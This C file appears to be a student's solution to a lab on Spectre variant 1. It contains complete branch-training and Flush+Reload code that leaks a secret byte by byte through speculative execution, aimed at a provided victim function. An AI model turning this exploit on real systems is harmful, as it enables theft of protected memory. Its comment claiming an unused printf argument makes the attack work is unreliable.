#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>

#include "spectre.h"

/********************************************************************
Victim functions
********************************************************************/
extern unsigned int array_size;
uint8_t victim_function(size_t x); // Spectre exfiltration gadget
size_t get_offset(); // Returns the offset from the array to the extracted you are supposed to extract

/********************************************************************
Spectre Attacker code
********************************************************************/
#define THRESHOLD 100  /* assume cache hit if time <= threshold ADJUST IF NECCESSARY */
#define MEASUREMENTS 1000
#define SECRET_LENGTH 34

uint8_t usr_array[256 * 512]; /* Used to leak the stolen bytes */
uint8_t temp = 0;

/* Bit magic returning malicious_idx if i%6==0 else returning training_idx */
/* Use this to properly train the branch prediction unit during the WAIT phase of the Flush+Reload*/
size_t get_nxt_idx(int i, size_t training_idx, size_t malicious_idx) {
    size_t x = ((i % 6) - 1) & ~0xFFFF; // 0xFFFF0000 if i%6==0 else 0x00000000
    x = (x | (x >> 16)); // 0xFFFFFFFF if i%6==0 else 0x00000000
    return training_idx ^ (x & (malicious_idx ^ training_idx));
}

/* Report best guess in value */
uint8_t stealSecretByte(size_t malicious_x) {
    static int cache_hits[256];

    for (int i = 0; i < 256; i++) {
        cache_hits[i] = 0;
    }
    for (int run = 0; run < MEASUREMENTS; ++run) {
        /* FLUSH all cachelines in usr_array */
        for (int i = 0; i < 256; i++)
            flush(usr_array + i * 512);

        /* WAIT */
        size_t training_idx = run % array_size;
        /* Do 30 times: */
        /* flush array_size to make the branch evaluation slow */
        /* determine the next index to access */
        /* call the victim function with that index */
        /* speculatively access the usr_array depending on the return value of the victim function */

        /********/
        /* TODO */
        /********/
        for (int i = 0; i < 30; i++) {
            flush(&array_size);
        lfence();

            int j = get_nxt_idx(i, training_idx, malicious_x);
            temp &= usr_array[victim_function(j) * 512];
        }

        /* RELOAD all cachelines in usr_array, time it and increment cache_hits[mixed_i] accordingly */
        /* Only increment cache_hits if mixed_i is not the value in array at index training_idx they are only accessed for training the branch predictor */
        for (int i = 0; i < 256; i++) {
            int mixed_i = ((i * 167) + 13) & 255; /* Use this value to access usr_array to prevent stride prediction */

            uint64_t start_time = rdtsc();
            maccess(usr_array + mixed_i * 512);
            if (rdtsc() - start_time < THRESHOLD && mixed_i != usr_array[training_idx])
                cache_hits[mixed_i]++;
        }
    }

    uint8_t guessed_byte = 0;
    /* Determine the byte with the most cache hits */
    for (int i = 0; i < 256; i++)
        if (cache_hits[i] >= cache_hits[guessed_byte])
            guessed_byte = i;

    return guessed_byte;
}

int main() {
    /* Store something in usr_array to actually place it in RAM */
    for (int i = 0; i < sizeof(usr_array); i++)
        usr_array[i] = 1;

    size_t secret_start_idx = get_offset();
    /* Byte-wise steal all SECRET_LENGTH secret bytes and print them */

    /* The first byte would never work, so we start one index before that */
    for (int i = -1; i < SECRET_LENGTH; i++) {
        uint8_t byte = stealSecretByte(secret_start_idx + i);
	/* the two bytes is intentional, even though the second argument is
	 * never used. However without this argument, the attack wouldn't work,
	 * for some reason.  */
	printf("%c", byte, byte);
	fflush(stdout);
    }

    putchar('\n');
    return 0;
}
